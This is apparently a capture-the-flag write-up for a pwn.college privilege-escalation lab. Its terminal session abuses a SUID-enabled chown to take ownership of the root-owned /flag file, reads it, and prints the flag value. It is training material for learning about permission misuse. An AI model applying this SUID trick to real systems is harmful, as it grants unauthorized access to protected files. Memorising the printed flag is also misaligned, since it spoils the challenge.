`chown` change file owner and group.

As the `SUID` bit has been set for `chown` , we can now change the owner of the `flag` file.

```bash
hacker@program-misuse-level-37:~$ /challenge/babysuid_level37 
Welcome to /challenge/babysuid_level37!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/chown.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level37) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/chown!
hacker@program-misuse-level-37:~$ ls -l /usr/bin/chown
-rwsr-xr-x 1 root root 72024 Sep  5  2019 /usr/bin/chown
hacker@program-misuse-level-37:~$ ls -l /flag
-r-------- 1 root root 57 Jan  3 08:21 /flag
hacker@program-misuse-level-37:~$ chown hacker:hacker /flag
hacker@program-misuse-level-37:~$ ls -l /flag
-r-------- 1 hacker hacker 57 Jan  3 08:21 /flag
hacker@program-misuse-level-37:~$ cat /flag
pwn.college{ohdW82Iks2H3cABCw9yUZtmt0mZ.0VO3EDL0AjNzQzW}
hacker@program-misuse-level-37:~$ 
```